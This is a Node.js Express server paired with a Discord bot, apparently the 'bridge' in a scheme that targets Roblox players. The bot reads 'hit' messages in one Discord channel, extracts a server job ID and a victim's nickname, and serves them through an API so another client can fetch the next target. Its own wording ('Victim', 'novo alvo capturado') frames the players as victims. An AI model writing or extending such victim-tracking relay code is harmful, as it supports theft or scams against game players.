const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');
const app = express();
app.use(express.json());

// CONFIGURAÇÕES VIA VARIÁVEIS DE AMBIENTE (SEGURO)
const DISCORD_TOKEN = process.env.DISCORD_TOKEN; 
const CHANNEL_ID = "1502418752946573362"; 

let currentHit = {
    jobId: null,
    victimNick: null,
    placeId: 142823291
};

// --- LÓGICA DO BOT DO DISCORD ---
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ] 
});

client.on('messageCreate', async (message) => {
    // Filtra canal e ignora bots
    if (message.channel.id !== CHANNEL_ID || message.author.bot) return;

    const content = message.content;
    const jobIdMatch = content.match(/[a-f0-9-]{30,}/);
    const nickMatch = content.match(/(?:Victim|User|Nick):\s*(\w+)/i) || content.match(/(\w+)/);

    if (jobIdMatch) {
        currentHit.jobId = jobIdMatch[0];
        currentHit.victimNick = (nickMatch && nickMatch[1]) ? nickMatch[1] : "Alvo_Detectado";
        console.log(`[PONTE] Novo alvo capturado: ${currentHit.victimNick}`);
    }
});

client.login(DISCORD_TOKEN).catch(err => console.error("Erro ao logar: Token inválido ou faltando!"));

// --- ROTAS DA API ---
app.get('/', (req, res) => res.send("Ponte Online e Segura!"));
app.get('/api/next', (req, res) => res.json(currentHit));
app.get('/api/clear', (req, res) => {
    currentHit = { jobId: null, victimNick: null, placeId: 142823291 };
    res.send("Resetado.");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor na porta ${PORT}`));
